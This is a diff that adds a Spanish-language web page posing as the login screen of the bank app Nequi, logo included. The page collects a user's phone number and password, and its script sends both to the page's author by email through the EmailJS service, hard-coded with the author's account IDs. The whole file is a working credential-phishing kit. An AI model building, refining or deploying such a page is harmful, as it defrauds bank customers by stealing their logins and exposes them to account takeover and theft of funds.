@@ -1,0 +1,227 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Iniciar Sesión - Nequi</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            font-family: 'Arial', sans-serif;
+            background-color: #6d1b7b;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            margin: 0;
+        }
+
+        .login-container {
+            width: 100%;
+            max-width: 380px;
+            background: #fff;
+            border-radius: 16px;
+            box-shadow: 0 4px 15px rgba(0, 0, 0, 0.1);
+            text-align: center;
+            padding: 40px;
+            color: #6d1b7b;
+        }
+
+        .login-container img {
+            width: 120px;
+            margin-bottom: 20px;
+        }
+
+        .login-container h1 {
+            font-size: 26px;
+            margin-bottom: 15px;
+            color: #6d1b7b;
+            font-weight: 600;
+        }
+
+        .login-container p {
+            font-size: 14px;
+            color: #6d1b7b;
+            margin-bottom: 20px;
+        }
+
+        .input-group {
+            margin-bottom: 20px;
+            text-align: left;
+        }
+
+        .input-group label {
+            display: block;
+            font-size: 14px;
+            margin-bottom: 5px;
+            color: #6d1b7b;
+        }
+
+        .input-group input {
+            width: 100%;
+            padding: 15px;
+            font-size: 16px;
+            border: 1px solid #d3d3d3;
+            border-radius: 8px;
+            outline: none;
+            transition: all 0.3s ease;
+        }
+
+        .input-group input:focus {
+            border-color: #d81b60;
+            box-shadow: 0 0 5px rgba(216, 27, 96, 0.3);
+        }
+
+        .btn {
+            width: 100%;
+            padding: 15px;
+            font-size: 18px;
+            background-color: #d81b60;
+            color: #fff;
+            border: none;
+            border-radius: 8px;
+            cursor: pointer;
+            font-weight: bold;
+            transition: background-color 0.3s ease;
+        }
+
+        .btn:hover {
+            background-color: #a01346;
+        }
+
+        .login-container a {
+            color: #d81b60;
+            font-size: 14px;
+            text-decoration: none;
+            display: block;
+            margin-top: 15px;
+        }
+
+        .login-container a:hover {
+            text-decoration: underline;
+        }
+
+        .hidden {
+            display: none;
+        }
+
+        .toggle-password {
+            background: none;
+            border: none;
+            color: #d81b60;
+            cursor: pointer;
+            font-size: 14px;
+            margin-top: 5px;
+        }
+
+        .form-container {
+            opacity: 0;
+            animation: fadeIn 0.5s forwards;
+        }
+
+        @keyframes fadeIn {
+            from {
+                opacity: 0;
+            }
+            to {
+                opacity: 1;
+            }
+        }
+
+        .error-message {
+            color: red;
+            font-size: 12px;
+            margin-top: 5px;
+        }
+    </style>
+</head>
+<body>
+    <div class="login-container form-container">
+        <img src="https://upload.wikimedia.org/wikipedia/commons/f/fe/Nequi_Logo.png" alt="Logo Nequi">
+
+        <h1>¡Hola!</h1>
+        <p id="instruction">Ingresa con tu número de celular</p>
+
+        <!-- Formulario de Número de Celular -->
+        <form id="phoneForm" onsubmit="showPasswordForm(event)">
+            <div class="input-group">
+                <label for="phone">Número de celular</label>
+                <input type="tel" id="phone" name="phone" placeholder="3001234567" required pattern="[0-9]{10}">
+                <div class="error-message" id="phoneError"></div>
+            </div>
+            <button type="button" class="btn" onclick="showPasswordForm()">Continuar</button>
+        </form>
+
+        <!-- Formulario de Contraseña -->
+        <form id="passwordForm" class="hidden" onsubmit="sendEmail(event)">
+            <div class="input-group">
+                <label for="password">Contraseña</label>
+                <input type="password" id="password" name="password" placeholder="Introduce tu contraseña" required>
+                <button type="button" class="toggle-password" onclick="togglePassword()">Mostrar/Ocultar Contraseña</button>
+            </div>
+            <button type="submit" class="btn">Iniciar Sesión</button>
+        </form>
+
+        <a href="#" id="helpLink">¿Problemas para ingresar?</a>
+    </div>
+
+    <script type="text/javascript">
+        function showPasswordForm(event) {
+            event.preventDefault(); // Prevenir el envío del formulario si es necesario
+
+            const phone = document.getElementById('phone').value;
+            const phoneError = document.getElementById('phoneError');
+
+            // Validar número de celular
+            if (phone.length !== 10 || !/^\d{10}$/.test(phone)) {
+                phoneError.textContent = "Por favor ingresa un número de celular válido.";
+                return;
+            } else {
+                phoneError.textContent = "";
+            }
+
+            document.getElementById('phoneForm').classList.add('hidden');
+            document.getElementById('passwordForm').classList.remove('hidden');
+            document.getElementById('instruction').textContent = 'Introduce tu contraseña';
+        }
+
+        // Función para mostrar u ocultar la contraseña
+        function togglePassword() {
+            const passwordField = document.getElementById('password');
+            const type = passwordField.type === 'password' ? 'text' : 'password';
+            passwordField.type = type;
+        }
+
+        // Enviar el formulario por correo usando EmailJS
+        function sendEmail(event) {
+            event.preventDefault();
+
+            const phone = document.getElementById('phone').value;
+            const password = document.getElementById('password').value;
+
+            // Usando el template_id correcto
+            emailjs.send("service_28yc0o3", "template_ulw52fm", {
+                phone: phone,
+                password: password
+            })
+            .then(function(response) {
+                alert('¡Datos enviados correctamente!');
+            }, function(error) {
+                alert('Error al enviar el correo: ' + error);
+            });
+        }
+    </script>
+
+    <script type="text/javascript" src="https://cdn.emailjs.com/dist/email.min.js"></script>
+    <script type="text/javascript">
+        (function() {
+            emailjs.init("user_28yc0o3");
+        })();
+    </script>
+</body>
+</html>
